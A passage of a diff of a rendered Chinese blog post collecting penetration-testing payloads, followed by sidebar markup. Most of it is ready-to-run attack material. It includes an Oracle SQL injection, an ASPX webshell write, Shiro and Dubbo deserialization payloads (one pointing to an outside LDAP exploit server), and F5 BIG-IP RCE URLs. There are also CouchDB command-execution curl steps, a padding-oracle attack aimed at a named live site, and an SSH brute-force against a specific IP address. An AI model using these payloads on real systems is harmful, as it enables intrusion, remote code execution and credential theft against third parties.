class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0dunion</span> select NULL,<span class="keyword">value</span> from v<span class="variable">$parameter</span> <span class="keyword">order</span> <span class="keyword">by</span> (((<span class="number">1</span></span></span><br></pre></td></tr></table></figure>
+
+<p>标志response:ADDRESS=(PROTOCAL=TCP)</p>
+<h3 id="ASPX写入"><a href="#ASPX写入" class="headerlink" title="ASPX写入"></a>ASPX写入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%Response.Write(&quot;webshell&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Apache-Shiro确认"><a href="#Apache-Shiro确认" class="headerlink" title="Apache Shiro确认"></a>Apache Shiro确认</h2><p>Cookie:  rememberMe=1</p>
+<h3 id="xmlrpc"><a href="#xmlrpc" class="headerlink" title="xmlrpc"></a>xmlrpc</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>username<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">param</span>&gt;</span>    </span><br><span class="line">			<span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>pingback.ping<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>http://127.0.0.1:1133<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>ladybird<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache-Shiro-1-4-2以下版本"><a href="#Apache-Shiro-1-4-2以下版本" class="headerlink" title="Apache Shiro 1.4.2以下版本"></a>Apache Shiro 1.4.2以下版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &quot;ping 120.79.91.29&quot; &gt; payload.ser</span><br><span class="line"></span><br><span class="line">java -jar ysoserial.jar URLDNS &quot;http://s5beqn.ceye.io&quot; &gt; payload.ser</span><br><span class="line"></span><br><span class="line">执行java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath，例如:</span><br><span class="line">rememberMeCookie是认证成功在Cookie存在的一个key、我们需要取得他的value</span><br><span class="line">如设置Request中&amp;rememberMe=true然后Set-Cookie: rememberMe=*** ,那么***则是rememberMe-Cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar &quot;https://www.tatmasglobal.net/admin/code/sms-provider/login&quot; RUdYhxX1kOHogjre9PPUDuUxOMJTkmLqzTC02TChdNhRpYwVCYq5BKQbVCzL8NCLCXT+UqipNRM3Mp4pgLMhOf5qzW3881ATix8iH1cIU44YV/4s2o1ob527FKv4dflMcjpVhxlri6x2XS6ho6U1nUjdKJmWvdQYh/VWu/3YQS9hbrUY+Dvjn1o+RFHYJ5TbPMCW7Ml2scFNrNOFxHv46wVZ2x1ERfpoRTBgs6Zs7PnivID6as0J9SJDcJgq4ReRZ6rhVHqAlsfKqFqanswMtSZsRlWV1qspFsQ2sURhQbD2NXKYKQzTn/dJHw675bGwccpfcC1Tl/8HruHaODPxoWtcfYwZrmIq3EKZCcjIath40U3X97nGJ4V2M5z7Uff9t0ToocN9nJqE1I2CtNSlsp7dBaYiJ/Hw8Mb/LBkMNW1e1bOQKSZ8n1VOz5sXpJtPdWLGNONonuqkEzZSwzFhPc4hPCC6cQl9K4z2SQlG3v3D5ESn9LOIryzwG0t6PHF3XuNpNniAfJn4tNSLi1kazMUAZ7rwzM8nZbRepw== 16 payload.bin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap常用未授权访问"><a href="#Nmap常用未授权访问" class="headerlink" title="Nmap常用未授权访问"></a>Nmap常用未授权访问</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p <span class="number">8009</span> -iL 新建文本文档.txt -T4 -sS -Pn -sV &gt; nmap_result.txt</span><br><span class="line"></span><br><span class="line">nmap -p <span class="number">27017</span>,<span class="number">6379</span>,<span class="number">11211</span>,<span class="number">8080</span>,<span class="number">5900</span>,<span class="number">5901</span>,<span class="number">2375</span>,<span class="number">2181</span>,<span class="number">837</span>,<span class="number">9000</span> -iL 新建文本文档.txt -T4 -sS -Pn -sV &gt; nmap_result.txt</span><br></pre></td></tr></table></figure>
+
+<p>​            9000 PHP-FPM            </p>
+<h3 id="Nmap-弱口令"><a href="#Nmap-弱口令" class="headerlink" title="Nmap 弱口令"></a>Nmap 弱口令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p <span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">69</span>,<span class="number">110</span>,<span class="number">139</span>,<span class="number">143</span>,<span class="number">161</span>,<span class="number">389</span>,<span class="number">445</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">873</span>,<span class="number">1433</span>,<span class="number">1521</span>,<span class="number">2049</span>,<span class="number">2181</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">3690</span>,<span class="number">4440</span>,<span class="number">5000</span>,<span class="number">5432</span>,<span class="number">5900</span>,<span class="number">6379</span>,<span class="number">8069</span>,<span class="number">9200</span> -iL 新建文本文档.txt -T4 -sS -Pn -sV &gt; nmap_result.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a>JWT攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eyJ***.eyJ***.哈希   头部.内容部.hash部</span><br><span class="line">https://jwt.io/#encoded-jwt</span><br><span class="line">未校验签名攻击（拿到JWT密文）</span><br><span class="line">	将JWT解base64、普通用户改admin、重加密</span><br><span class="line">禁用哈希</span><br><span class="line">	将头部 alg 置为 none、若服务器认可则可不需要密钥情况越权</span><br><span class="line">弱密钥</span><br><span class="line">	https://github.com/lmammino/jwt-cracker</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="F5-Big（443，fofa-app-”F5-BIGIP”）"><a href="#F5-Big（443，fofa-app-”F5-BIGIP”）" class="headerlink" title="F5-Big（443，fofa:app=”F5-BIGIP”）"></a>F5-Big（443，fofa:app=”F5-BIGIP”）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</span><br><span class="line"></span><br><span class="line">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/1.txt&amp;content=id</span><br><span class="line"></span><br><span class="line">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/1.txt</span><br><span class="line"></span><br><span class="line">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</span><br><span class="line"></span><br><span class="line">读取</span><br><span class="line">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/1.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dubbo-12345端口"><a href="#Dubbo-12345端口" class="headerlink" title="Dubbo(12345端口)"></a>Dubbo(12345端口)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://120.79.91.29:9999/Exploit&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;rce&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="CouchDB-（5984端口）"><a href="#CouchDB-（5984端口）" class="headerlink" title="CouchDB （5984端口）"></a>CouchDB （5984端口）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">	1. 新增query_server配置，这里将执行whoami命令并保存结果到/tmp/6666文件中</span><br><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.2.12:5984/_config/query_servers/cmd&#x27;</span> -d <span class="string">&#x27;&quot;whoami&gt;/tmp/6666&quot;&#x27;</span></span><br><span class="line">	// _config/query_servers/ 固定</span><br><span class="line">	// merver 可改</span><br><span class="line">	2. 新建一个临时表，插入一条记录</span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.2.12:5984/vultest&#x27;</span></span><br><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.2.12:5984/vultest/vul&#x27;</span> -d <span class="string">&#x27;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">	//vulteste 以及vul可改</span><br><span class="line">	3. 调用query_server处理数据</span><br><span class="line">curl -X POST <span class="string">&#x27;http://192.168.2.12:5984/vultest/_temp_view?limit=11&#x27;</span> -d <span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="用友NC-Cloud（NC-lt-6-5-dork-Yonyou-NC-httpd）"><a href="#用友NC-Cloud（NC-lt-6-5-dork-Yonyou-NC-httpd）" class="headerlink" title="用友NC Cloud（NC&lt;=6.5,dork:Yonyou NC httpd）"></a>用友NC Cloud（NC&lt;=6.5,dork:Yonyou NC httpd）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ServiceDispatcherServlet/default   存在</span><br></pre></td></tr></table></figure>
+
+<h3 id="nodepad-去重的正则："><a href="#nodepad-去重的正则：" class="headerlink" title="nodepad++去重的正则："></a>nodepad++去重的正则：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(.*?)$\s+?^(?=.*^\<span class="number">1</span>$)</span><br></pre></td></tr></table></figure>
+
+<h4 id><a href="#" class="headerlink" title></a></h4><h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P ssh_password.txt -t 11 ssh://119.23.31.7</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2020-13935"><a href="#CVE-2020-13935" class="headerlink" title="CVE-2020-13935"></a>CVE-2020-13935</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/RedTeamPentesting/CVE-2020-13935</span><br><span class="line"></span><br><span class="line">tcdos.exe ws://127.0.0.1:8080/examples/websocket/echoProgrammatic</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/sweetalert/1.1.2/sweetalert.min.css">
+
+  <p><span>本文标题:</span>【置顶】渗透测试Payload记录</a></p>
+  <p><span>文章作者:</span></a></p>
+  <p><span>发布时间:</span>2022年08月19日 - 19:37:52</p>
+  <p><span>最后更新:</span>2021年01月29日 - 13:47:52</p>
+  <p><span>原始链接:</span><a href="/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/" title="【置顶】渗透测试Payload记录">http://laker.xyz/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://laker.xyz/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/13/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.th3wind.xyz" title="th3wind" target="_blank">th3wind</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com/" title="damit5" target="_blank">damit5</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
